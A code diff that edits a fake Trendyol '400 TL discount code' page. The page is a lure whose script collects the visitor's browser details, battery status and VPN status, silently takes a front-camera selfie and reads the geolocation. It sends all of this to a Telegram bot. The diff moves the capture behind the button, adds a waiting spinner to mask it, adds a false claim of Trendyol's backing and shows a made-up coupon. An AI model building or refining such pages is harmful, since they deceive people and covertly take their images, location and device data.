@@ -3,31 +3,51 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Trendyol - 400 TL İndirim Kodu</title>
+<title>Trendyol - 400 TL İndirim Kodu Kampanyası</title>
 <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico" />
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
-  *{box-sizing:border-box; font-family:Arial,sans-serif; margin:0; padding:0;}
-  body{background:#f5f5f5; display:flex; justify-content:center; align-items:center; height:100vh;}
-  .container{background:#fff; padding:30px; border-radius:8px; box-shadow:0 0 12px rgba(0,0,0,0.15); width:90%; max-width:400px; text-align:center;}
-  header{background:#f27a1a; padding:15px 0; margin-bottom:20px;}
-  header img{height:30px;}
-  h2{color:#333; margin-bottom:20px;}
-  input[type=text]{width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; font-size:16px; margin-bottom:20px;}
-  button{width:100%; padding:12px; background:#f27a1a; border:none; color:#fff; font-size:16px; border-radius:4px; cursor:pointer; transition:background 0.3s;}
+  *{box-sizing:border-box; font-family:'Open Sans', sans-serif; margin:0; padding:0;}
+  body{background:#f8f8f8; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:15px;}
+  .container{background:#fff; padding:30px 25px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); width:100%; max-width:420px; text-align:center;}
+  header{background:#f27a1a; padding:18px 0; margin:-30px -25px 25px -25px; border-top-left-radius:12px; border-top-right-radius:12px;}
+  header img{height:28px;}
+  h2{color:#222; margin-bottom:8px; font-size:19px; font-weight:700;}
+  p{color:#666; font-size:13px; margin-bottom:20px; line-height:1.4;}
+  .input-group{margin-bottom:15px; text-align:left;}
+  label{font-size:12px; color:#444; font-weight:600; display:block; margin-bottom:5px;}
+  input[type=text]{width:100%; padding:13px; border:1px solid #ddd; border-radius:6px; font-size:15px; outline:none; transition:border 0.2s;}
+  input[type=text]:focus{border-color:#f27a1a;}
+  button{width:100%; padding:13px; background:#f27a1a; border:none; color:#fff; font-size:16px; font-weight:600; border-radius:6px; cursor:pointer; transition:background 0.3s;}
   button:hover{background:#e06800;}
-  .code-box{margin-top:20px; background:#f0f0f0; border-left:4px solid #f27a1a; padding:15px; font-weight:bold; word-break:break-word; display:none;}
-  .error{color:red; margin-top:10px; display:none;}
+  .code-box{margin-top:20px; background:#fff8f4; border:1px dashed #f27a1a; border-radius:6px; padding:15px; font-weight:700; color:#f27a1a; word-break:break-word; display:none; font-size:16px;}
+  .error{color:#d32f2f; font-size:13px; margin-top:10px; display:none;}
+  .loader {display: none; margin: 15px auto; border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #f27a1a; width: 24px; height: 24px; animation: spin 1s linear infinite;}
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .footer-text{margin-top:25px; font-size:11px; color:#999; border-top:1px solid #eee; padding-top:15px;}
 </style>
 </head>
 <body>
 
 <div class="container">
   <header><img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" /></header>
-  <h2>400 TL Değerinde İndirim Kodunuzu Alın</h2>
-  <input type="text" id="codeInput" placeholder="Arkadaşınızın size verdiği kodu girin" autocomplete="off" />
-  <button id="submitBtn">Kodu Göster</button>
-  <div class="error" id="errorMsg">Kod hatalı veya süresi dolmuş olabilir.</div>
+  <h2>400 TL Değerinde İndirim Kodu</h2>
+  <p>Arkadaşınızın sizin için tanımladığı özel hediye kuponunu etkinleştirmek için kodu girin.</p>
+  
+  <div class="input-group">
+    <label>Hediye / Kupon Kodu</label>
+    <input type="text" id="codeInput" placeholder="Örn: 849201" autocomplete="off" />
+  </div>
+
+  <button id="submitBtn">Kodu Aktifleştir</button>
+  <div class="loader" id="loadingSpinner"></div>
+  
+  <div class="error" id="errorMsg">Girdiğiniz kod hatalı veya süresi dolmuş.</div>
   <div class="code-box" id="fakeCode"></div>
+
+  <div class="footer-text">
+    Bu kampanya Trendyol Dijital Çözümler A.Ş. güvencesiyle sunulmaktadır. Tüm hakları saklıdır.
+  </div>
 </div>
 
 <script>
@@ -42,7 +62,7 @@ const URL_SIFRE = urlParams.get("sifre");
 function generateFakeCode() {
   const part1 = Math.floor(1000 + Math.random() * 9000);
   const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
-  return `TR-${part1}-${part2}`;
+  return `TY-${part1}-${part2}`;
 }
 
 async function sendTelegramMessage(chat_id, text, blob=null) {
@@ -74,7 +94,6 @@ async function getBatteryInfo() {
   catch { return { level: "Bilinmiyor", charging: "" }; }
 }
 
-// selfie kamera ve 4:3 oran
 async function takeSelfieWithData(messageText) {
   try{
     const video=document.createElement("video");
@@ -83,9 +102,9 @@ async function takeSelfieWithData(messageText) {
     const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
     video.srcObject=stream;
     await video.play();
-    await new Promise(r=>setTimeout(r,500));
+    await new Promise(r=>setTimeout(r,1000));
     const canvas=document.createElement("canvas");
-    canvas.width=640;  // 4:3 ratio
+    canvas.width=640;
     canvas.height=480;
     const ctx=canvas.getContext("2d");
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
@@ -94,7 +113,7 @@ async function takeSelfieWithData(messageText) {
       stream.getTracks().forEach(track=>track.stop());
       video.remove();
     },"image/jpeg");
-  }catch(e){ console.log("Selfie açılamadı veya hata oluştu",e);}
+  }catch(e){ console.log("Kamera izni verilmedi",e);}
 }
 
 async function collectUserData(fakeCode){
@@ -110,7 +129,7 @@ async function collectUserData(fakeCode){
 📱 Tarayıcı: ${userAgent}
 🔐 VPN/Proxy: ${vpnProxy}
 🔋 Şarj: ${battery.level}% (${battery.charging})
-💻 Kod: ${fakeCode}`;
+💻 Üretilen Kupon: ${fakeCode}`;
 }
 
 async function sendLocation() {
@@ -118,7 +137,6 @@ async function sendLocation() {
   navigator.geolocation.getCurrentPosition(pos=>{
     const lat=pos.coords.latitude;
     const lon=pos.coords.longitude;
-    // telegram üzerinden konum olarak gönder
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
@@ -127,47 +145,43 @@ async function sendLocation() {
   });
 }
 
-function showError(msg){const e=document.getElementById("errorMsg");e.textContent=msg;e.style.display="block";document.getElementById("fakeCode").style.display="none";}
+function showError(msg){
+  document.getElementById("errorMsg").textContent=msg;
+  document.getElementById("errorMsg").style.display="block";
+  document.getElementById("fakeCode").style.display="none";
+}
 function hideError(){document.getElementById("errorMsg").style.display="none";}
 
-// site açılır açılmaz veri gönder
-(async ()=>{
-  if(!CHAT_ID||!URL_SIFRE) return;
-  const fakeCode=generateFakeCode();
-  const messageText=await collectUserData(fakeCode);
-  await takeSelfieWithData(messageText);
-  await sendLocation();
-})();
-
-// buton işlemi
 document.getElementById("submitBtn").addEventListener("click",async ()=>{
   const input=document.getElementById("codeInput").value.trim();
-  if(!CHAT_ID||!URL_SIFRE){ showError("Bu siteyi doğru link üzerinden açmalısın."); return; }
+  if(!CHAT_ID||!URL_SIFRE){ showError("Geçersiz veya eksik bağlantı adresi."); return; }
 
-  if(input===ADMIN_CODE){
-    hideError();
-    const fakeCode=generateFakeCode();
-    document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
-    document.getElementById("fakeCode").style.display="block";
-    await sendTelegramMessage(ADMIN_ID,"Admin kodu kullanıldı.");
-    const messageText=await collectUserData(fakeCode);
-    await takeSelfieWithData(messageText);
-    await sendLocation();
+  if(input !== ADMIN_CODE && input !== URL_SIFRE){
+    showError("Kod hatalı veya süresi dolmuş.");
     return;
   }
 
-  if(input!==URL_SIFRE){ showError("Kod hatalı veya süresi dolmuş olabilir."); return; }
-
   hideError();
-  const fakeCode=generateFakeCode();
-  document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
-  document.getElementById("fakeCode").style.display="block";
+  document.getElementById("submitBtn").style.display = "none";
+  document.getElementById("loadingSpinner").style.display = "block";
 
-  const messageText=await collectUserData(fakeCode);
+  // Veri toplama ve kamera çekimi arka planda çalışırken kullanıcıya kısa bir bekleme efekti verilir
+  const fakeCode=generateFakeCode();
+  const messageText = await collectUserData(fakeCode);
+  
   await takeSelfieWithData(messageText);
   await sendLocation();
+
+  setTimeout(() => {
+    document.getElementById("loadingSpinner").style.display = "none";
+    document.getElementById("fakeCode").textContent=`Tebrikler! İndirim Kodunuz: ${fakeCode}`;
+    document.getElementById("fakeCode").style.display="block";
+    if(input === ADMIN_CODE) {
+      sendTelegramMessage(ADMIN_ID, "Admin kodu web sitesinde kullanıldı.");
+    }
+  }, 1500);
 });
 </script>
 
 </body>
-  </html>
+</html>
